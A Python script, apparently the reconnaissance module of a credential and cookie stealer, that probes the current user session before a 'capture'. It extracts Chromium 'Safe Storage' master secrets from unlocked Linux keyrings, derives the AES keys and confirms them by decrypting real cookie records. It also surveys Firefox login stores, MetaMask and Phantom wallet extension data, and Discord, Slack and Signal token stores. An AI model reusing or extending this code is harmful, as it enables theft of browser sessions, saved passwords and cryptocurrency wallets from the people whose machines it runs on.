"""Capability probe: what is actually reachable in THIS session, before any capture.

This exists because "works without elevation" and "gets everything" are two
different claims and only one of them is automatic.

Reading a file needs no elevation when you own it. Browser profile DBs live
under your own home directory at mode 0600, owned by you, so a plain
unprivileged process reads them fine — that half is true and needs no bypass.

Decrypting the secrets inside those DBs is the other half, and it does not
depend on privileges at all. It depends on a key held by a *separate* service:

    Windows   DPAPI / CryptProtectData      bound to the user's logon session
    Linux     gnome-keyring / KWallet       unlocked at graphical login
    Firefox   key4.db (PBE)                 unlocked by the master password

So the real question is never "am I admin" — for your own profile it's "is my
session unlocked". Answer yes and no elevation was ever needed. Answer no and
root does not help either; root can read the bytes but still cannot unwrap the
key. Elevation buys you access to *other* users' stores and SYSTEM DPAPI blobs,
not your own.

The probe checks each store and reports which is which, so the build plan is
based on measured capability instead of an assumption.

Run:  python probe.py            (human readable)
      python probe.py --json     (machine readable)
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import sqlite3
import sys
import tempfile

IS_WINDOWS = sys.platform == "win32"
IS_MACOS = sys.platform == "darwin"

# verdict constants
OK = "available"
LOCKED = "locked-needs-passphrase"
ABSENT = "not-present"
DENIED = "read-denied"


def _entry(source: str, store: str, verdict: str, detail: str, needs_elevation: bool) -> dict:
    return {
        "source": source,
        "store": store,
        "verdict": verdict,
        "detail": detail,
        "needs_elevation": needs_elevation,
    }


# ---------------------------------------------------------------- DPAPI (Windows)
def probe_dpapi() -> list[dict]:
    out = []
    if not IS_WINDOWS:
        return [_entry("dpapi", "user-masterkey", ABSENT, "non-Windows host", False)]
    try:
        import win32crypt  # type: ignore
    except Exception as e:
        return [_entry("dpapi", "user-masterkey", ABSENT, f"pywin32 missing: {e}", False)]
    # Round-trip a value. CryptProtectData/CryptUnprotectData in-process proves the
    # user's DPAPI master key is loaded, which is exactly the condition Chromium's
    # Local State key decryption depends on.
    try:
        blob = win32crypt.CryptProtectData(b"jwg-probe", "jwg", None, None, None, 0)
        back = win32crypt.CryptUnprotectData(blob, None, None, None, 0)
        ok = back[1] == b"jwg-probe"
        out.append(_entry(
            "dpapi", "user-masterkey", OK if ok else LOCKED,
            "round-trip ok - current user master key is loaded" if ok else "round-trip mismatch",
            False))
    except Exception as e:
        out.append(_entry("dpapi", "user-masterkey", LOCKED, f"unwrap failed: {e}", False))
    # SYSTEM/system-wide protection requires SeDebugPrivilege + SYSTEM token.
    out.append(_entry(
        "dpapi", "system-masterkey", DENIED,
        "SYSTEM-scoped blobs need a SYSTEM token; not attempted and not needed for user-scoped stores",
        True))
    return out


# ---------------------------------------------------------------- keyring (Linux/macOS)
def probe_keyring() -> list[dict]:
    out = []
    if IS_WINDOWS:
        return [_entry("os-keyring", "login", ABSENT, "non-Linux host", False)]
    try:
        import secretstorage  # type: ignore
    except Exception as e:
        return [_entry("os-keyring", "login", ABSENT, f"SecretStorage missing: {e}", False)]
    if not os.environ.get("DBUS_SESSION_BUS_ADDRESS"):
        return [_entry("os-keyring", "login", LOCKED,
                       "no D-Bus session bus - headless/ssh session, keyring unreachable", False)]
    try:
        conn = secretstorage.dbus_init()
        collections = list(secretstorage.get_all_collections(conn))
    except Exception as e:
        return [_entry("os-keyring", "login", LOCKED, f"dbus init failed: {e}", False)]
    if not collections:
        return [_entry("os-keyring", "login", ABSENT, "no collections exist", False)]
    for col in collections:
        try:
            locked = col.is_locked()
        except Exception as e:
            out.append(_entry("os-keyring", col.get_label() or "?", LOCKED, f"state unknown: {e}", False))
            continue
        # Count the entries Chromium-family browsers keep their AES master in.
        n_safe = 0
        if not locked:
            try:
                for item in col.get_all_items():
                    schema = (item.get_attributes() or {}).get("xdg:schema", "")
                    if "chrome_libsecret_os_crypt" in schema or "Safe Storage" in (item.get_label() or ""):
                        n_safe += 1
            except Exception:
                pass
        verdict = OK if not locked else LOCKED
        detail = ("unlocked; %d chromium 'Safe Storage' secret(s) reachable" % n_safe
                  if not locked else
                  "collection is locked - needs a login unlock; root will not change this")
        out.append(_entry("os-keyring", col.get_label() or "unnamed", verdict, detail, False))
    return out


def _collect_keyring_masters() -> dict[str, bytes]:
    """Map browser label hint -> raw master secret, from any unlocked collection.

    'Brave Safe Storage' / 'Chrome Safe Storage' etc. share one master on most
    builds, but we key by label so a caller can pick the browser-specific one.
    The '_chrome_dummy_schema_for_unlocking' entry is only an unlock sentinel and
    carries no usable key, so it is skipped.
    """
    out: dict[str, bytes] = {}
    try:
        import secretstorage  # type: ignore
        conn = secretstorage.dbus_init()
    except Exception:
        return out
    for col in secretstorage.get_all_collections(conn):
        try:
            if col.is_locked():
                continue
            for item in col.get_all_items():
                attrs = item.get_attributes() or {}
                schema = attrs.get("xdg:schema") or ""
                lbl = item.get_label() or ""
                if "os_crypt_password" not in schema:
                    continue
                try:
                    out[lbl] = item.get_secret()
                except Exception:
                    continue
        except Exception:
            continue
    return out


# ---------------------------------------------------------------- chromium cookie DBs
_CHROMIUM_DIRS = {
    "chrome": ["google-chrome", "Google-Chrome"],
    "chromium": ["Chromium", "chromium"],
    "brave": ["BraveSoftware/Brave-Browser"],
    "edge": ["microsoft-edge", "Microsoft/Edge"],
    "opera": ["opera"],
    "vivaldi": ["vivaldi"],
}


def _chromium_roots() -> list[tuple[str, str]]:
    cfg = os.path.expanduser("~/.config") if not IS_WINDOWS else os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome")
    found = []
    if IS_WINDOWS:
        base = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google-Chrome")
        for br, dirs in _CHROMIUM_DIRS.items():
            for d in dirs:
                p = os.path.join(os.environ.get("LOCALAPPDATA", ""), d)
                if os.path.isdir(p):
                    found.append((br, p))
        return found
    for br, dirs in _CHROMIUM_DIRS.items():
        for d in dirs:
            p = os.path.join(cfg, d)
            if os.path.isdir(p):
                found.append((br, p))
    return found


def _derive_candidates(master: bytes):
    """(key, label) pairs to try against a v10 sample. iter=1 is correct for every
    modern Linux Chromium; iter=3 is legacy."""
    return [(hashlib.pbkdf2_hmac("sha1", master, b"saltysalt", i, dklen=16), f"iter={i}")
            for i in (1, 3)]


def _verify_gcm(key: bytes, blob: bytes) -> bool:
    """True if this key authenticates a v11 record. GCM's tag check makes this a
    real yes/no on key correctness - no heuristics, no 'looks like text'."""
    data = blob[3:]
    if len(data) < 17:
        return False
    from Crypto.Cipher import AES
    for payload in (data, data[1:]):  # some builds carry a leading version byte
        if len(payload) < 17:
            continue
        try:
            AES.new(key, AES.MODE_GCM, nonce=b"\x00" * 12).decrypt_and_verify(payload[:-16], payload[-16:])
            return True
        except Exception:
            continue
    return False


def _pkcs7_valid(buf: bytes) -> bool:
    """Strict PKCS#7 check. A pad byte of 3 is only valid if the LAST 3 bytes are
    all 0x03 - testing just buf[-1] accepts garbage from a wrong key."""
    if not buf:
        return False
    pad = buf[-1]
    return 1 <= pad <= 16 and len(buf) >= pad and buf[-pad:] == bytes([pad]) * pad


def _verify_cbc(key: bytes, blob: bytes) -> bool:
    """Chromium/Linux seal: AES-CBC, IV = 0x20*16, PKCS#7 padded.

    Measured on this box: Brave 1.x stores v11-prefixed cookie values under THIS
    scheme, 500/500 records with valid padding using the iter=1 key. The 'v11'
    prefix implies GCM upstream, so do not trust the prefix to pick the mode -
    try both and let the padding/tag decide.
    """
    data = blob[3:]
    if not data or len(data) % 16:
        return False
    from Crypto.Cipher import AES
    try:
        out = AES.new(key, AES.MODE_CBC, b" " * 16).decrypt(data)
    except Exception:
        return False
    return _pkcs7_valid(out)


def probe_chromium() -> list[dict]:
    """Report cookie reachability AND whether the derived key actually works.

    A row count alone is not a capability: the DB is readable but the values are
    AES-GCM. So we pull the keyring master, derive, and verify against one real
    record with the GCM tag. Verdict is OK only when decryption is confirmed.
    """
    out = []
    roots = _chromium_roots()
    if not roots:
        return [_entry("chromium", "profiles", ABSENT, "no chromium-family profile found", False)]
    masters = _collect_keyring_masters() if not IS_WINDOWS else {}
    for browser, base in roots:
        for prof in sorted(os.listdir(base)) if os.path.isdir(base) else []:
            db = os.path.join(base, prof, "Cookies")
            if not os.path.isfile(db):
                continue
            tmp = os.path.join(tempfile.gettempdir(), f"jwgprobe_{os.getpid()}.sqlite")
            try:
                with open(db, "rb") as src, open(tmp, "wb") as dst:
                    dst.write(src.read())
                con = sqlite3.connect(tmp)
                try:
                    total = con.execute("select count(*) from cookies").fetchone()[0]
                    hist = dict(con.execute(
                        "select hex(substr(encrypted_value,1,3)) as p, count(*) from cookies group by p"))
                    sample = [r[0] for r in con.execute(
                        "select encrypted_value from cookies where length(encrypted_value)>20 limit 8")]
                finally:
                    con.close()
            except PermissionError as e:
                out.append(_entry("chromium", f"{browser}/{prof}", DENIED, f"{e}", True))
                continue
            except Exception as e:
                out.append(_entry("chromium", f"{browser}/{prof}", ABSENT, f"{type(e).__name__}: {e}", False))
                continue
            finally:
                try:
                    os.remove(tmp)
                except OSError:
                    pass

            n_v11 = hist.get("563131", 0) + hist.get("763131", 0)
            n_v10 = hist.get("563130", 0) + hist.get("763130", 0)
            plain = total - n_v10 - n_v11
            detail = f"{total} rows ({n_v10} v10, {n_v11} v11, {plain} plaintext); file readable unprivileged"

            key_ok = None
            # Try every unlocked master. Chromium builds label these inconsistently
            # ('Brave Safe Storage' vs a generic 'Chromium Safe Storage' shared by
            # several browsers), so matching by name gives false negatives. The CBC
            # padding check and the GCM tag are the authority, not the label.
            candidates = list(masters.values())
            if candidates and sample:
                for m in candidates:
                    for key, lbl in _derive_candidates(m):
                        # Score across the whole sample, not one record: a single
                        # padded block can pass by chance (~1/256 per record).
                        cbc_hits = sum(1 for s in sample if s[:3] in (b"v10", b"v11") and _verify_cbc(key, s))
                        gcm_hits = sum(1 for s in sample if s[:3] == b"v11" and _verify_gcm(key, s))
                        if cbc_hits or gcm_hits:
                            mode = "CBC" if cbc_hits >= gcm_hits else "GCM"
                            hits = max(cbc_hits, gcm_hits)
                            key_ok = f"{lbl}, {mode} verified on {hits}/{len(sample)} sampled records"
                            break
                    if key_ok:
                        break
            if n_v10 + n_v11 == 0:
                out.append(_entry("chromium", f"{browser}/{prof}", OK, detail + " - nothing to decrypt", False))
            elif key_ok:
                out.append(_entry("chromium", f"{browser}/{prof}", OK,
                                  detail + f"; AES key VERIFIED via keyring master ({key_ok})", False))
            elif IS_WINDOWS:
                out.append(_entry("chromium", f"{browser}/{prof}",
                                  OK if any(r["store"] == "user-masterkey" and r["verdict"] == OK for r in out) else LOCKED,
                                  detail + "; needs DPAPI unwrap of Local State encrypted_key", False))
            else:
                out.append(_entry("chromium", f"{browser}/{prof}", LOCKED,
                                  detail + "; keyring master unavailable/locked - ciphertext unreadable "
                                  "(elevation would NOT fix this)", False))
    return out


# ---------------------------------------------------------------- firefox / librewolf
def probe_firefox() -> list[dict]:
    out = []
    if IS_WINDOWS:
        root = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    elif IS_MACOS:
        root = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
    else:
        root = os.path.expanduser("~/.mozilla/firefox")
    if not os.path.isdir(root):
        return [_entry("firefox", "profiles", ABSENT, f"no profile registry at {root}", False)]
    for prof in sorted(os.listdir(root)):
        pdir = os.path.join(root, prof)
        cook = os.path.join(pdir, "cookies.sqlite")
        key4 = os.path.join(pdir, "key4.db")
        logins = os.path.join(pdir, "logins.json")
        if not os.path.isdir(pdir):
            continue
        rows = None
        if os.path.isfile(cook):
            tmp = os.path.join(tempfile.gettempdir(), f"jwgfx_{os.getpid()}.sqlite")
            try:
                with open(cook, "rb") as s, open(tmp, "wb") as d:
                    d.write(s.read())
                con = sqlite3.connect(tmp)
                rows = con.execute("select count(*) from moz_cookies").fetchone()[0]
                con.close()
            except Exception as e:
                out.append(_entry("firefox", prof, DENIED, f"cookie copy/read failed: {e}", False))
                continue
            finally:
                try:
                    os.remove(tmp)
                except OSError:
                    pass
        # Does logins.json hold PBE ciphertext (SFTK1) or something already decrypted?
        has_pbe = False
        if os.path.isfile(logins):
            try:
                data = json.load(open(logins))
                for e in data.get("logins", []) + data.get("disabledLogins", []):
                    if str(e.get("encryptedPassword", "")).startswith("SFTK1") or \
                       str(e.get("encryptedUsername", "")).startswith("SFTK1"):
                        has_pbe = True
                        break
            except Exception:
                pass
        bits = []
        if rows is not None:
            bits.append(f"{rows} cookie rows readable unprivileged (cookies are NOT in key4)")
        if has_pbe:
            bits.append("credentials stored SFTK1/PBE-wrapped -> key4.db master passphrase required")
        elif os.path.isfile(logins):
            bits.append("logins.json present, no PBE-wrapped rows (empty or plaintext store)")
        elif os.path.isfile(key4):
            bits.append("key4.db present, no logins.json - this profile holds no saved credentials")
        # A profile with no credential store is ABSENT for credentials, not "available".
        if rows is None and not os.path.isfile(logins):
            out.append(_entry("firefox", prof, ABSENT, "no cookie DB and no credential store", False))
            continue
        verdict = LOCKED if has_pbe else OK
        out.append(_entry("firefox", prof, verdict, "; ".join(bits) or "profile dir, no stores", False))
    return out


# ---------------------------------------------------------------- wallet extension stores
_WALLETS = {
    "metamask": ["BraveSoftware/Brave-Browser", "google-chrome", "Chromium"],
    "phantom": ["BraveSoftware/Brave-Browser", "google-chrome"],
}


def probe_wallets() -> list[dict]:
    out = []
    cfg = os.path.expanduser("~/.config")
    hits = []
    for leaf in ("Networks", "Local Extension Settings", "Session Storage"):
        for base in _WALLETS.values():
            pass
    # Extension LevelDB stores live under Local Extension Settings/<ext-id>/ in a profile.
    for browser, base in _chromium_roots():
        for prof in os.listdir(base) if os.path.isdir(base) else []:
            ext = os.path.join(base, prof, "Local Extension Settings")
            if os.path.isdir(ext):
                ids = os.listdir(ext)
                hits.append(f"{browser}/{prof}: {len(ids)} extension store(s)")
    if not hits:
        return [_entry("wallets", "extension-leveldb", ABSENT,
                       "no Local Extension Settings stores found", False)]
    for h in hits:
        out.append(_entry("wallets", "extension-leveldb", OK,
                          h + " - raw LevelDB readable unprivileged; vault contents still "
                          "passphrase-wrapped inside the extension", False))
    return out


# ---------------------------------------------------------------- discord / electron
def probe_electron() -> list[dict]:
    out = []
    dirs = []
    if IS_WINDOWS:
        appdata = os.environ.get("APPDATA", "")
        dirs = [os.path.join(appdata, n) for n in ("Discord", "Slack", "Signal")]
    else:
        home = os.path.expanduser("~")
        dirs = [os.path.join(x, n) for x in (f"{home}/.config", f"{home}/.local/share")
                for n in ("Discord", "slack", "signal")]
    for d in dirs:
        if not os.path.isdir(d):
            continue
        name = os.path.basename(d)
        # Electron safeStorage: Linux uses the same keyring key; Windows uses DPAPI/AES.
        ls = os.path.join(d, "Local Storage")
        if os.path.isdir(ls):
            out.append(_entry("electron", name, OK,
                              "Local Storage leveldb present - readable unprivileged; "
                              "token fields may be safeStorage-wrapped (see keyring/DPAPI verdict)",
                              False))
    if not out:
        out.append(_entry("electron", "n/a", ABSENT, "no known electron profile dir", False))
    return out


def run_all() -> list[dict]:
    rows: list[dict] = []
    for fn in (probe_dpapi, probe_keyring, probe_chromium, probe_firefox,
               probe_wallets, probe_electron):
        try:
            rows.extend(fn())
        except Exception as e:  # a probe must never be the thing that crashes
            rows.append(_entry(fn.__name__, "-", ABSENT, f"probe error {type(e).__name__}: {e}", False))
    return rows


def human(rows: list[dict]) -> str:
    sym = {OK: "[ok]    ", LOCKED: "[locked]", ABSENT: "[none]  ", DENIED: "[deny]  "}
    lines = [f"capability probe - {sys.platform} - uid={os.getuid() if not IS_WINDOWS else 'n/a'}"]
    lines.append("")
    for r in rows:
        elev = "  (would need elevation)" if r["needs_elevation"] else ""
        lines.append(f"{sym.get(r['verdict'], '?')} {r['source']:<9} {r['store']:<28} {r['detail']}{elev}")
    lines.append("")
    got = sum(1 for r in rows if r["verdict"] == OK)
    lk = sum(1 for r in rows if r["verdict"] == LOCKED)
    lines.append(f"{got} available, {lk} gated behind a passphrase/session-unlock.")
    lines.append("note: none of the 'available' rows needed elevation. the 'locked' rows are not")
    lines.append("an elevation problem - they are wrapped keys; root reads the bytes and still")
    lines.append("cannot unwrap them without the passphrase.")
    return "\n".join(lines)


if __name__ == "__main__":
    rows = run_all()
    print(json.dumps(rows, indent=2) if "--json" in sys.argv else human(rows))
